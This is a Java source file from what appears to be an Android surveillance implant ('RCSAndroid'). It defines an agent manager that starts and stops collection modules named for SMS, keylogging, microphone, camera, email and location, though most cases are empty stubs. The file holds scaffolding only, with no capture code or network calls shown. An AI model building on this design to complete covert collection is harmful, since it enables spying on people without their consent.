/***********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 30-mar-2011
 **********************************************/

package com.ht.RCSAndroidGUI.agent;

import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

import android.util.Log;

import com.ht.RCSAndroidGUI.Manager;
import com.ht.RCSAndroidGUI.Status;
import com.ht.RCSAndroidGUI.event.Event;
import com.ht.RCSAndroidGUI.event.EventBase;
import com.ht.RCSAndroidGUI.utils.Check;

/**
 * The Class AgentManager.
 */
public class AgentManager extends Manager {

	/** The Constant TAG. */
	private static final String TAG = "AgentManager";

	/** The singleton. */
	private volatile static AgentManager singleton;

	/** The status obj. */
	private final Status statusObj;

	/** The running. */
	private final HashMap<Integer, AgentBase> running;
	private HashMap<AgentBase, Thread> threads;

	/**
	 * Self.
	 * 
	 * @return the agent manager
	 */
	public static AgentManager self() {
		if (singleton == null) {
			synchronized (AgentManager.class) {
				if (singleton == null) {
					singleton = new AgentManager();
				}
			}
		}

		return singleton;
	}

	/**
	 * Instantiates a new agent manager.
	 */
	private AgentManager() {
		statusObj = Status.self();

		running = new HashMap<Integer, AgentBase>();
		threads = new HashMap<AgentBase, Thread>();
	}

	/**
	 * mapAgent() Add agent id defined by "key" into the running map. If the
	 * agent is already present, the old object is returned.
	 * 
	 * @param key
	 *            : Agent ID
	 * @return the requested agent or null in case of error
	 */
	private AgentBase mapAgent(final int key) {
		AgentBase a = null;

		if (running.containsKey(key) == true) {
			return running.get(key);
		}

		switch (key) {
		case Agent.AGENT_SMS:
			break;

		case Agent.AGENT_TASK:
			break;

		case Agent.AGENT_CALLLIST:
			break;

		case Agent.AGENT_DEVICE:
			a = new DeviceAgent();
			break;

		case Agent.AGENT_POSITION:
			break;

		case Agent.AGENT_CALL:
			break;

		case Agent.AGENT_CALL_LOCAL:
			break;

		case Agent.AGENT_KEYLOG:
			break;

		case Agent.AGENT_SNAPSHOT:
			a = new SnapshotAgent();
			break;

		case Agent.AGENT_URL:
			break;

		case Agent.AGENT_IM:
			break;

		case Agent.AGENT_EMAIL:
			break;

		case Agent.AGENT_MIC:
			break;

		case Agent.AGENT_CAM:
			break;

		case Agent.AGENT_CLIPBOARD:
			break;

		case Agent.AGENT_CRISIS:
			break;

		case Agent.AGENT_APPLICATION:
			break;

		default:
			break;
		}

		if (a != null) {
			running.put(key, a);
		}

		return a;
	}

	/**
	 * Start agents.
	 * 
	 * @return true, if successful
	 */
	public boolean startAgents() {
		HashMap<Integer, Agent> agents;
		agents = statusObj.getAgentsMap();

		if (agents == null) {
			Log.d("RCS", "Agents map null");
			return false;
		}

		if (running == null) {
			Log.d("RCS", "Running Agents map null");
			return false;
		}

		final Iterator<Integer> it = agents.keySet().iterator();

		while (it.hasNext()) {
			final Integer key = it.next();
			startAgent(key);
		}

		return true;
	}

	// XXX Deve essere bloccante? Ovvero attendere l'effettivo stop di tutto?
	/**
	 * Stop agents.
	 */
	public void stopAgents() {
		HashMap<Integer, Agent> agents;
		agents = statusObj.getAgentsMap();
		final Iterator<Integer> it = agents.keySet().iterator();

		while (it.hasNext()) {
			final Integer key = it.next();
			stopAgent(key);
		}
	}

	/**
	 * Start agent.
	 * 
	 * @param key
	 *            the key
	 */
	public synchronized void startAgent(final int key) {
		HashMap<Integer, Agent> agents;

		agents = statusObj.getAgentsMap();

		if (agents == null) {
			Log.d("RCS", "Agents map null");
			return;
		}

		if (running == null) {
			Log.d("RCS", "Running Agents map null");
			return;
		}

		AgentBase a = mapAgent(key);

		if (a == null) {
			return;
		}

		// Agent mapped and running
		if (a.getStatus() == Agent.AGENT_RUNNING) {
			Log.d("RCS", "Agent " + key + " is already running");
			return;
		}

		// start() will NEVER be valid again on a stopped thread
		// so unmap and restart the thread
		if (a.getStatus() == Agent.AGENT_STOPPED) {
			// running.remove(key);
			a = mapAgent(key);
		}

		Check.asserts(a != null, "null agent");
		Check.asserts(running.get(key) != null, "null running");
		
		a.parse(agents.get(key).getParams());

		Thread t = new Thread(a);
		threads.put(a, t);
		t.start();

	}

	/**
	 * Stop agent.
	 * 
	 * @param key
	 *            the key
	 */
	public synchronized void stopAgent(final int key) {
		final AgentBase a = running.get(key);

		if (a == null) {
			Log.d("RCS", "Agent " + key + " not present");
			return;
		}

		a.stopThread();

		Thread t = threads.get(a);
		if (t != null) {
			try {
				t.join();
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		threads.remove(a);
	}

	/**
	 * Restart agent.
	 * 
	 * @param key
	 *            the key
	 */
	public synchronized void restartAgent(final int key) {
		final AgentBase a = running.get(key);
		stopAgent(key);
		startAgent(key);
	}

	/**
	 * Reload agent.
	 * 
	 * @param key
	 *            the key
	 */
	public void reloadAgent(final int key) {
		final AgentBase a = running.get(key);
		a.next();
	}
}
